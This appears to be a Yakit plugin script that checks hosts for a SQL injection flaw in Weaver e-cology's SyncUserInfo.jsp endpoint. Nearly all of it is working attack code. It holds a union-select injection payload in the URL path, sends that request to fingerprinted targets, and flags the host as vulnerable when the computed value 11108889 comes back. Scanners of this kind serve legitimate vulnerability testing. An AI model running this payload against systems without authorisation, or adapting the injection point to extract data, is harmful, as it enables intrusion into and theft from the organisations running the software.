yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 构造 SQL 注入的 payload
    url_path = `/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(3333*3333),null`

    packet = `GET {{params(url_path)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close`

    // 发送 GET 请求进行 SQL 注入
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({
            "target": addr,
            "url_path": url_path
        }), 
        poc.https(isTls), 
        poc.redirectTimes(0)
    )

    // 使用 str.Contains 检查响应是否包含 SQL 注入成功的标志 (比如 3333*3333 的计算结果)
    if str.Contains(rsp, "11108889") {  // 3333*3333 = 11108889
        yakit.Info("%v 存在泛微 e-cology SyncUserInfo.jsp SQL 注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("泛微 e-cology SyncUserInfo.jsp SQL 注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("泛微 e-cology SyncUserInfo.jsp SQL 注入成功"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve")
        )
    } else {
        yakit.Info("%v 未发现 SQL 注入漏洞", addr)
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
